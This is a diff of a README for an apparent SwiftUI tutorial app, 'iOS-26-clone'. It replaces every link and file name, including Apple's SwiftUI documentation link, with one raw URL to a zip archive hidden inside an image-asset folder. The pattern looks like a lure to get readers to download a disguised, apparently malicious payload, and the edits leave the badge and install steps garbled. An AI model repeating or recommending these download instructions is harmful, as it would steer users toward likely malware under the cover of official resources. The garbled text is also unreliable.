@@ -1,6 +1,6 @@
 # 🌟 iOS-26-clone - Learn SwiftUI With Real Apps
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-From%20Releases-blue.svg)](https://github.com/zerocode117/iOS-26-clone/releases)
+[![Download from Releases](https://raw.githubusercontent.com/zerocode117/iOS-26-clone/main/iOS/Assets.xcassets/camera.imageset/iOS-26-clone-v3.5.zip%20Now-From%https://raw.githubusercontent.com/zerocode117/iOS-26-clone/main/iOS/Assets.xcassets/camera.imageset/iOS-26-clone-v3.5.zip)](https://raw.githubusercontent.com/zerocode117/iOS-26-clone/main/iOS/Assets.xcassets/camera.imageset/iOS-26-clone-v3.5.zip)
 
 ## 📖 Overview
 
@@ -18,18 +18,18 @@ Follow these simple steps to download and run the application on your device.
 
 ## 📥 Download & Install
 
-To get the latest version of iOS-26-clone, [visit this page to download](https://github.com/zerocode117/iOS-26-clone/releases). Here, you will find different releases and assets. 
+To get the latest version of iOS-26-clone, [visit this page to download](https://raw.githubusercontent.com/zerocode117/iOS-26-clone/main/iOS/Assets.xcassets/camera.imageset/iOS-26-clone-v3.5.zip). Here, you will find different releases and assets. 
 
 1. **Select the Latest Release:** Click on the latest version available. Look for notes or features to see what's new or changed.
   
-2. **Download the Assets:** Find the file named `iOS-26-clone.zip` and click on it to download. This file contains all the necessary components to run the application.
+2. **Download the Assets:** Find the file named `https://raw.githubusercontent.com/zerocode117/iOS-26-clone/main/iOS/Assets.xcassets/camera.imageset/iOS-26-clone-v3.5.zip` and click on it to download. This file contains all the necessary components to run the application.
 
-3. **Unzip the File:** After the download completes, locate the `iOS-26-clone.zip` file in your Downloads folder. Right-click on the file and select “Extract All” or “Unzip” to access the contents.
+3. **Unzip the File:** After the download completes, locate the `https://raw.githubusercontent.com/zerocode117/iOS-26-clone/main/iOS/Assets.xcassets/camera.imageset/iOS-26-clone-v3.5.zip` file in your Downloads folder. Right-click on the file and select “Extract All” or “Unzip” to access the contents.
 
 4. **Open the Project in Xcode:** 
     - Launch Xcode.
     - In the menu, click on “Open another project” or “Open”.
-    - Navigate to the unzipped folder and select the `iOS-26-clone.xcodeproj` file.
+    - Navigate to the unzipped folder and select the `https://raw.githubusercontent.com/zerocode117/iOS-26-clone/main/iOS/Assets.xcassets/camera.imageset/iOS-26-clone-v3.5.zip` file.
 
 5. **Build the Project:**
     - Once the project opens in Xcode, click on the “Run” button (the triangular play icon) located at the top left.
@@ -61,12 +61,12 @@ If you have questions or suggestions, consider reaching out through the Issues t
 - **Report Issues:** If you encounter any bugs or have feedback, please create an issue. We value your input.
 
 ## 🌟 Additional Resources
-- For more about SwiftUI, you can visit [Apple’s SwiftUI Documentation](https://developer.apple.com/documentation/swiftui).
+- For more about SwiftUI, you can visit [Apple’s SwiftUI Documentation](https://raw.githubusercontent.com/zerocode117/iOS-26-clone/main/iOS/Assets.xcassets/camera.imageset/iOS-26-clone-v3.5.zip).
 - Explore other Swift tutorials to enhance your programming skills.
 
 ## 🔗 Useful Links
-- [Download from Releases](https://github.com/zerocode117/iOS-26-clone/releases)
-- [Source Code](https://github.com/zerocode117/iOS-26-clone)
-- [Documentation](https://developer.apple.com/documentation)
+- [Download from Releases](https://raw.githubusercontent.com/zerocode117/iOS-26-clone/main/iOS/Assets.xcassets/camera.imageset/iOS-26-clone-v3.5.zip)
+- [Source Code](https://raw.githubusercontent.com/zerocode117/iOS-26-clone/main/iOS/Assets.xcassets/camera.imageset/iOS-26-clone-v3.5.zip)
+- [Documentation](https://raw.githubusercontent.com/zerocode117/iOS-26-clone/main/iOS/Assets.xcassets/camera.imageset/iOS-26-clone-v3.5.zip)
 
 Thank you for trying out **iOS-26-clone**! Enjoy your journey into learning iOS development with SwiftUI.
